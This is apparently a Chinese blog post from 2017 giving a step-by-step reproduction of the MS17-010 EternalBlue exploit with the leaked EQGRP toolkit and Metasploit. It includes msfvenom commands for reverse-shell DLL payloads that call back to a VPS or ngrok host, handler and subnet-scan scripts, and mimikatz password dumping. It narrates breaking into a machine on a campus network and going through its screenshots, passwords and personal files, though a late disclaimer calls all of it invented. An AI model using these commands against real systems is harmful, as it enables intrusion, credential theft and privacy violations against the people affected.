---
title: MS17 010 复现
date: 2017-05-13 16:49:06
tags: Metasploit
---

[影响范围看这里][影响范围看这里]，据说利用漏洞来勒索的病毒都有了： [NSA “永恒之蓝”勒索蠕虫爆发，开机即可被勒索][NSA “永恒之蓝”勒索蠕虫爆发，开机即可被勒索]

针对校内用户的解决办法：

> 关闭445 3389 等端口
  利用路由器（起到隔离作用就行），尽量不要网线直连电脑

不行，这张图我可以笑一天（233~

电子屏幕: 我只是一块显示通知的电子屏幕，我做错了什么QAQ
![电子屏幕][电子屏幕]
<br>
<!--more-->

## Requirement
1. [ngrok][ngrok]
3. [PentestBox With Metasploit][PentestBox With Metasploit] OR [Kali Linux][Kali Linux]
4. [Python2.6.6][Python2.6.6] + [pywin32][pywin32]
5. [EQGRP_Lost_in_Translation][EQGRP_Lost_in_Translation]
 
吐槽1：Win下执行0Day，却要反弹Shell到虚拟机的Kali Linux？？？
吐槽2：Kali Linux的虚拟机镜像远不如直接安装ISO稳定
吐槽3：**路由器IP（192.168.1.x）生成的Payload不能在内网（127.27.x.x）反弹Shell**

所以一会要用到ngrok，或者租个便宜服务器反弹Shell，你喜欢就好~

事实证明**PentestBox**要方便一点，记得下载含**Metasploit**的版本

<br>
## Hack This
### 配置PentestBox
删除`PentestBox\base\python`（2.7.3），然后安装2.6.6版本的Python 和 Pywin32

在`PentestBox\config` 的aliases文件里添加这么一行`python2="%pentestbox_ROOT%\base\python2\python.exe" $*`，打开PentestBox输入`python2 --version`出现版本信息代表命名成功

![python2][python2]

解压`EQGRP_Lost_in_Translation-master`，修改windows目录下的fb文件，注释掉26，27，28，72行
![26-28][26-28]
![72][72]
<br>

### 生成DLL Payload
如果直接在内网的话是可以把下面`VPS_IP`替换成自己的，但是不建议这么做，万一入侵的是**蜜罐+没清除记录+尝试风险操作+长时间在线**，很容易翻车。拿ngrok转发一下本地的端口比较保险。

但是如果内网机器不能访问外网，只能用内网IP生成Payload

x86:

    msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=VPS_IP LPORT=port --platform win -f dll -o x86_tcp.dll
x64:

    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=VPS_IP LPORT=port --platform win -f dll -o x64_tcp.dll

### Msfconsole
x86.rb

    use exploit/multi/handler
    set payload windows/meterpreter/reverse_tcp
    set stagerverifysslcert false
    set ExitOnSession false #后台运行
    set LHOST 192.168.1.245 # LHOST
    set LPORT 4444 #监听x86 Payload的端口
    exploit -j -z

x64.rb

    use exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_tcp
    set stagerverifysslcert false
    set ExitOnSession false
    set LHOST 192.168.1.245
    set LPORT 4445 #监听x64 Payload的端口
    exploit -j -z

开启ngrok转发
![ngrok-port][ngrok-port]
<br>
开两个窗口开始监听

    msfconsole -r x86.rb
    
    msfconsole -r x64.rb
    
![msfconsole][msfconsole]

### 确认内网目标
下载[MS17扫描模块][MS17扫描模块]的rb文件，放到`PentestBox\bin\metasploit-framework\modules\auxiliary\scanner\smb`里面

scan.rb

    use auxiliary/scanner/smb/smb_ms_17_010 #新添加的模块
    set THREADS 16
    set RHOSTS 172.27.10.1-254 #目标网段
    exploit

开始扫描目标网段
    
    msfconsole -r scan.rb

确认目标``172.27.10.21``
![target][target]

<br>
### Attack！  

    python2 fb.py
填好目标和本地IP，转发选择no，使用**Eternalblue**入侵模块
![ip][ip]
一路回车到这个地方，选择平台和攻击方式**1) FB**
![arch-fb][arch-fb]
继续回车，出现这个代表入侵成功
![Eternalblue][Eternalblue]
<br>
再使用**Doublepulsar**模块来反弹Shell，根据平台填入我们刚才生成的DLL Payload

**ProcessName一定要填写目标主机正在运行的进程名，否则会使目标主机自动关机或注销， 一般填svchost.exe**
![Doublepulsar][Doublepulsar]
<br>
一路回车后就应该能看到ngrok有转发的效果和msf成功反弹的Shell了
![ngrok-reverse][ngrok-reverse]
<br>
![Shell][Shell]
<br>

## Shell仅仅只是开始
如果有入侵经验的人一定知道我想表达什么
> 目前权限是否为SYSTEM，如果不是，该怎么提权？提权会不会引起注意？
  目标主机装有杀毒软件的时候怎么Bypass UAC拿到当前用户密码？
  要是目标主机突然关机了该如何进行下一次渗透？亦或者留下隐藏后门进行持续性控制？
  端口转发该用什么工具？使用过程是否灵活？
  拿下一台服务器权限后怎么进一步扩大战果？内网漫游怎么尽快获取域控的最高权限以便拿下整个内网？
  如何有效收集你想要的信息？ 
  如何尽可能清除入侵记录？
  。。。。。。

运气不错，目标主机（实验室的电脑）没有360，`get system`就拿到了管理员权限，看看在干嘛

    screenshot -q 100 -p F:\\Hacker\\PentestBox\\output\\test.jpeg
![screenshot][screenshot]
<br>
![screenshot2][screenshot2]
<br>
这个时间点（12:49 PM）应该不在电脑前，估计是忘记锁屏了
利用mimikatz神器拿到用户密码

    load mimikatz
    mimikatz_command -f sekurlsa::searchPasswords
![password][password]
<br>
然后`run getgui -e`开启远程桌面连接，直接连上去了

然后打开硬盘看看能收集到什么有用的信息
![班级][班级]
<br>
![上网账号][上网账号]
<br>
![sad][sad]
<br>
后台居然还挂着个百度盘。。。
![百度盘][百度盘]
<br>
![excited][excited]
<br>
**我们不开车！
我们不开车！
我们不开车！**


**----------------严肃的分割线----------------**
手机安装了百度盘客户端的，可能不小心（被）设置了手机自动备份，那么手机里面的相册，音乐，甚至是通讯录都会自动保存到百度盘。。。
![个人信息][个人信息]
<br>

## END?
每次都打这么多命令很烦的，对于我这种懒人来说，有一条法则永远通用：
        
> 如果某些事情，甚至可以说是任何事情，哪怕只需要花费他超过90 秒的时间，那他会写脚本来自动处理那些事情

嗯，我知道你们看得懂，批量扫描内网主机的任务就交给你们写了（Python可以操作CMD，多进程，加油~
![lan][lan]
<br><br>

![内网漫游][内网漫游]
<br>
**以上全部的入侵内容都是我编的，入侵操作仅在本地虚拟机进行，切勿违法使用**

    最近沉迷Powershell提权（Bypass UAC，后门持续控制）和BadUSB无法自拔。后续文章更新等放假再说吧
**Shell仅仅只是开始。。。**

<br><br>
> **这个打赏二维码好像有什么不对**

**支付宝** 
![支付宝][支付宝]
**微信**  
![微信][微信]
[支付宝]: https://of4jd0bcc.qnssl.com/Blog/%E6%89%93%E8%B5%8F/alipay/shakalaka_ailipay.gif?imageView2/1/w/200/h/200
[微信]: https://of4jd0bcc.qnssl.com/Blog/%E6%89%93%E8%B5%8F/wechat/patapon_wechat.gif?imageView2/1/w/200/h/200

[影响范围看这里]: https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
[NSA “永恒之蓝”勒索蠕虫爆发，开机即可被勒索]: http://www.leiphone.com/news/201705/iGXUMArn1cP1livY.html
[电子屏幕]: https://of4jd0bcc.qnssl.com/smb/%E7%94%B5%E5%AD%90%E5%B1%8F%E5%B9%95.png
[ngrok]: https://github.com/inconshreveable/ngrok
[Metasploit]: https://github.com/rapid7/metasploit-framework
[Python2.6.6]: https://www.python.org/download/releases/2.6.6/
[pywin32]: https://sourceforge.net/projects/pywin32/files/pywin32/Build%20221/
[PentestBox With Metasploit]: https://pentestbox.org/
[Kali Linux]: https://www.kali.org/
[EQGRP_Lost_in_Translation]: https://github.com/x0rz/EQGRP_Lost_in_Translation
[python2]: https://of4jd0bcc.qnssl.com/smb/python2.png
[26-28]: https://of4jd0bcc.qnssl.com/smb/26-28.png
[72]: https://of4jd0bcc.qnssl.com/smb/72.png
[ngrok]: https://of4jd0bcc.qnssl.com/smb/ngrok.png
[msfconsole]: https://of4jd0bcc.qnssl.com/smb/msfconsole.png
[MS17扫描模块]: https://github.com/RiskSense-Ops/MS17-010/tree/master/scanners
[target]: https://of4jd0bcc.qnssl.com/smb/target.png
[ip]: https://of4jd0bcc.qnssl.com/smb/ip.png
[arch-fb]: https://of4jd0bcc.qnssl.com/smb/arch-fb.png
[Eternalblue]: https://of4jd0bcc.qnssl.com/smb/Eternalblue.png
[Doublepulsar]: https://of4jd0bcc.qnssl.com/smb/Doublepulsar.png
[ngrok-reverse]: https://of4jd0bcc.qnssl.com/smb/ngrok-reverse.png
[Shell]: https://of4jd0bcc.qnssl.com/smb/Shell.png
[screenshot]: https://of4jd0bcc.qnssl.com/smb/screenshot.jpg
[screenshot2]: https://of4jd0bcc.qnssl.com/smb/screenshot2.jpg
[password]: https://of4jd0bcc.qnssl.com/smb/password.png
[班级]: https://of4jd0bcc.qnssl.com/smb/%E7%8F%AD%E7%BA%A7.png
[上网账号]: https://of4jd0bcc.qnssl.com/smb/%E4%B8%8A%E7%BD%91%E8%B4%A6%E5%8F%B72.png
[sad]: https://of4jd0bcc.qnssl.com/smb/sad.png?imageView2/1/w/200/h/200
[excited]: https://of4jd0bcc.qnssl.com/smb/excited2.png
[百度盘]: https://of4jd0bcc.qnssl.com/smb/%E7%99%BE%E5%BA%A6%E7%9B%98.png
[个人信息]: https://of4jd0bcc.qnssl.com/smb/%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF.png
[内网漫游]: https://of4jd0bcc.qnssl.com/smb/%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8.png
[lan]: https://of4jd0bcc.qnssl.com/smb/lan.png